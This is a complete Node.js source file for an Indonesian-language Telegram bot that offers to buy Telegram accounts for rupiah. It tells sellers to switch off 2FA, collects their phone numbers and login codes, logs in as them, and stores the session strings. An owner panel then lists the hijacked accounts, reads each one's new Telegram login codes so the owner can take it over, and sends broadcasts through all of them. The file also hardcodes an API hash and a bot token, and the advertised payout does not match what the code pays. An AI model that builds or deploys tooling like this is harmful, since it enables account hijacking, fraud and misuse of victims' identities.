const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8238521944:AAGtfc6goWfX0bmm1cmKuYlD-p3lIGjJvCM';
const logChannel = '-1003121256961';
const ownerId = 8457401920; 

const bot = new Telegraf(botToken);
const DB_FILE = './sessions.json';
const MIN_WD = 50000;

// --- DATABASE HANDLER ---
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [], users: {} }));
}

const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userSessions = {}; 

// --- TEMPLATE PESAN ---
const startText = (name) => 
    `✨ **SELAMAT DATANG, ${name.toUpperCase()}!** ✨\n\n` +
    `🚀 **VortexNode Cloud** adalah platform terbaik untuk menukarkan akun Telegram Anda menjadi pundi-pundi Rupiah secara instant.\n\n` +
    `💎 **KEUNTUNGAN MENJUAL DI SINI:**\n` +
    `• 🟢 **Proses Otomatis:** Saldo langsung masuk tanpa menunggu.\n` +
    `• 🟢 **Harga Kompetitif:** Rp 20.000 - Rp 25.000 per akun.\n` +
    `• 🟢 **Aman & Terpercaya:** Sesi disimpan dengan enkripsi.\n\n` +
    `⚠️ **SYARAT WAJIB:**\n` +
    `1. Matikan **Password/2FA** (Wajib).\n` +
    `2. Akun tidak dalam masa ban/spam.\n` +
    `3. Gunakan nomor aktif yang bisa menerima kode.`;

const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN (INSTANT)', 'jual_akun')],
    [Markup.button.callback('👤 MY PROFILE', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

const backBtn = (target) => Markup.inlineKeyboard([
    [Markup.button.callback('🔙 KEMBALI KE MENU', target)]
]);

// --- START COMMAND ---
bot.start((ctx) => {
    ctx.reply(startText(ctx.from.first_name), mainBtn());
});

bot.action('main_menu', (ctx) => {
    ctx.editMessageText(startText(ctx.from.first_name), mainBtn());
});

// --- LOGIKA JUAL AKUN ---
bot.action('jual_akun', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.editMessageText(
        '📲 **MASUKKAN NOMOR TELEGRAM**\n\nSilahkan kirim nomor Anda dengan format kode negara.\n\nContoh: `62812345678`',
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    const db = getData();

    if (!state) return;

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        state.phone = text.replace(/[^0-9]/g, '');
        const msg = await ctx.reply(`⏳ Menghubungi server Telegram untuk ${state.phone}...`);
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
            
            state.client = client;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nMasukkan kode dengan spasi agar sistem tidak error.\n\nContoh: `1 2 3 4 5`', { parse_mode: 'Markdown' });
        } catch (err) {
            ctx.reply('❌ **GAGAL:** ' + err.message, mainBtn());
            delete userSessions[userId];
        }
    }

    // STEP 2: INPUT OTP (SALDO LANGSUNG MASUK)
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        ctx.reply('⚙️ **MENVERIFIKASI AKUN...**');

        try {
            const client = state.client;
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            
            // Tentukan Harga Progresif
            // Jika chat ID dimulai dengan angka 1, dapat 25rb. Jika tidak, 20rb.
            const harga = String(state.phone).startsWith('1') ? 25000 : 5000;

            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                sellerId: userId,
                sellerName: ctx.from.first_name,
                date: new Date().toLocaleString()
            });

            if (!db.users[userId]) db.users[userId] = { balance: 0 };
            db.users[userId].balance += harga;
            
            saveData(db);
            
            ctx.reply(
                `✅ **TRANSAKSI BERHASIL!**\n\n` +
                `Akun: \`${state.phone}\`\n` +
                `Bonus Saldo: +Rp ${harga.toLocaleString()}\n` +
                `Saldo Sekarang: Rp ${db.users[userId].balance.toLocaleString()}`,
                { parse_mode: 'Markdown', ...mainBtn() }
            );

            // NOTIF KE CHANNEL
            bot.telegram.sendMessage(logChannel, 
                `✅ **AKUN TERJUAL**\n` +
                `━━━━━━━━━━━━━━\n` +
                `👤 User: ${ctx.from.first_name}\n` +
                `📱 No: ${state.phone}\n` +
                `💰 Harga: Rp ${harga.toLocaleString()}\n` +
                `📅 Date: ${new Date().toLocaleString()}`
            );
            
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ **LOGIN GAGAL:** ' + err.message + '\nPastikan Password (2FA) sudah nonaktif.', mainBtn());
        }
        delete userSessions[userId];
    }

    // STEP 3: WITHDRAW
    else if (state.step === 'input_wd') {
        const parts = text.split('-'); 
        const amount = parseInt(parts[2]?.trim() || 0);
        const currentBal = db.users[userId]?.balance || 0;

        if (amount < MIN_WD) return ctx.reply(`❌ Minimal WD Rp ${MIN_WD.toLocaleString()}`, backBtn('withdraw'));
        if (amount > currentBal) return ctx.reply(`❌ Saldo tidak cukup!`, backBtn('withdraw'));

        db.users[userId].balance -= amount;
        saveData(db);
        ctx.reply('✅ **PENARIKAN BERHASIL DIAJUKAN!**\nAdmin akan segera mengirimkan dana ke nomor Anda.', mainBtn());
        
        bot.telegram.sendMessage(logChannel, 
            `💸 **WD REQUEST**\n` +
            `━━━━━━━━━━━━━━\n` +
            `👤 User: ${ctx.from.first_name}\n` +
            `📝 Detail: ${text}\n` +
            `💰 Status: Pending Admin`
        );
        delete userSessions[userId];
    }

    // STEP 4: BROADCAST
    else if (state.step === 'input_bc') {
        ctx.reply('📢 Memproses Broadcast...');
        let count = 0;
        for (const acc of db.accounts) {
            try {
                const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
                await client.connect();
                await client.sendMessage('me', { message: text });
                count++;
                await client.disconnect();
            } catch (e) {}
        }
        ctx.reply(`✅ Selesai! Pesan terkirim ke ${count} akun.`, backBtn('owner_menu'));
        delete userSessions[userId];
    }
});

// --- PROFILE ---
bot.action('profile', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    const totalAkun = db.accounts.filter(a => a.sellerId === ctx.from.id).length;
    
    ctx.editMessageText(
        `👤 **PROFIL PENGGUNA**\n\n` +
        `• Nama: ${ctx.from.first_name}\n` +
        `• ID: \`${ctx.from.id}\`\n` +
        `• Saldo: **Rp ${bal.toLocaleString()}**\n` +
        `• Total Penjualan: ${totalAkun} Akun`,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

// --- WITHDRAW ---
bot.action('withdraw', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    if (bal < MIN_WD) return ctx.answerCbQuery(`Saldo Anda kurang dari Rp ${MIN_WD.toLocaleString()}`, { show_alert: true });
    
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.editMessageText(
        `💸 **MENU PENARIKAN**\n\n` +
        `Saldo Tersedia: **Rp ${bal.toLocaleString()}**\n` +
        `Minimal WD: **Rp 20.000**\n\n` +
        `Silahkan balas dengan format:\n` +
        `**E-WALLET - NOMOR - JUMLAH**\n\n` +
        `Contoh: \`DANA - 08123456789 - 50000\``,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

// --- OWNER MENU ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    ctx.editMessageText('👑 **OWNER CONTROL PANEL**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 LIHAT DAFTAR NOMOR', 'list_0')],
        [Markup.button.callback('📢 BROADCAST KE SEMUA', 'bc_menu')],
        [Markup.button.callback('🔙 KEMBALI', 'main_menu')]
    ]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const accounts = getData().accounts;
    const current = accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
    if ((page * 5) + 5 < accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    
    ctx.editMessageText(`📑 **DATABASE AKUN (Hal ${page + 1})**`, Markup.inlineKeyboard(buttons));
});

bot.action(/^detail_(\d+)$/, (ctx) => {
    const idx = parseInt(ctx.match[1]);
    const acc = getData().accounts[idx];
    ctx.editMessageText(
        `📄 **DETAIL AKUN**\n\nNomor: ${acc.phone}\nPenjual: ${acc.sellerName}\nTanggal: ${acc.date}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 CEK OTP TELEGRAM', `sms_${idx}`)],
            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
        ])
    );
});

bot.action(/^sms_(\d+)$/, async (ctx) => {
    const idx = parseInt(ctx.match[1]);
    const acc = getData().accounts[idx];
    ctx.answerCbQuery('Membuka sesi...');
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 });
        ctx.reply(`📩 **OTP @TELEGRAM (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) { ctx.reply('❌ Gagal: Akun tidak aktif.'); }
});

bot.action('bc_menu', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_bc' };
    ctx.editMessageText('📢 **BROADCAST**\n\nKetik pesan yang akan dikirim ke semua akun yang ada di database:', backBtn('owner_menu'));
});

bot.launch();
console.log('🚀 Vortex Cloud Bot is Online!');
